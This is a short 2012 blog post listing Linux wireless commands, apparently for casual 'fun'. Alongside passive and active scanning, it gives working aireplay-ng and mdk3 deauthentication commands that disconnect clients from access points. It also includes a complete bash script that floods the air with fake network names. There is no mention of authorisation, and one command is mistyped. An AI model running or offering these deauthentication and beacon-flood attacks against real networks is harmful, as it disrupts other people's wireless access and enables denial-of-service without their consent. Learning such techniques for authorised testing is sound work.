---
title:  Wireless Fun with Aircrack and Others
date:   2012-11-05 00:00:00 -0500
categories: IT
---

A short list of some things you can do with wireless on a linux box. Have fun.

***Determine Modes your NIC is capable of.***

```bash
airmon-ng (find PHY# for your NIC)
iw phy phy1 info | grep â€“A8 modes
```

***Passive Scan (Should not generate any frames)***

```bash
iw dev wlan0 scan passive | grep SSID
```

***Active Scan***

```bash
iw dev wlan0 scan | grep SSID
airmon-ng start wlan0
airodump-ng mon0
iwconfig wlan0 channel #
iwconfig wlan0 essid <ssid>
iwconfig wlan0 mode managed
```

***Deauthorization***

```bash
iwconfig mon0 channel #
aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```

- -0 means deauthentication
- 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously
- -a 00:14:6C:7E:40:80 is the MAC address of the access point
- -c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated
- ath0 is the interface name

***Deauthorization with ***MDK3***

```bash
airmon-ng start wlan0
dk3 mon0 d
```

or

```bash
mdk3 mon0 d -w whitelist (deauth everything not listed in file)
```

or

```bash
mdk3 mon0 d -b blacklist (deauth everything listed in file)

d - deauthorization mode
w - whitelist
b - blacklist```
***Broadcast Network Names with MDK3***
```bash
airmon-ng start wlan0
mdk3 mon0 b -c 11 -f ssid_names
```

- b - beacon flood mode
- c - channel
- f - text file with ssid names

Everything you need to run a beacon flood in one script.

```bash
networks=(
"FreeWifi"
"FBI Van #12"
"Customer Wireless"
"Visitors"
"ATTWifi"
"Verizon Hotspot"
"l33t haxor net"
)

if [ -f ssid_names ]
then
echo -e "\e[1;31mDeleting list of network names\e[0m"
rm -f ssid_names
fi

echo -e "\e[1;32mCreating list of network names\e[0m"
for i in "${networks[@]}"
do
echo $i >> ssid_names
done

if [[ -n $(airmon-ng | grep mon0) ]]
then
echo -e "\e[1;32mMon0 interface exists\e[0m"
else
echo -e "\e[1;32mStarting AirMon on wlan0\e[0m"
airmon-ng start wlan0
fi

echo -e "\e[1;32mBegin beacon flood on mon0\e[0m"
mdk3 mon0 b -c 11 -f ssid_names
```

- <a href="http://www.cyberciti.biz/tips/linux-find-out-wireless-network-speed-signal-strength.html" target="_blank">8 Linux Commands: To Find Out Wireless Network Speed, Signal Strength And Other Information</a>
- <a style="text-decoration: underline;" title="airplay-ng Deauthentication" href="http://www.aircrack-ng.org/doku.php?id=deauthentication" target="_blank">aircrack-ng Deauthorize</a>
- <a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank">airmon-ng</a>
- <a href="http://www.linuxcommand.org/man_pages/iwconfig8.html" target="_blank">iwconfig man page</a>
- <a href="http://wireless.kernel.org/en/users/Documentation/iw" target="_blank">iw command info</a>
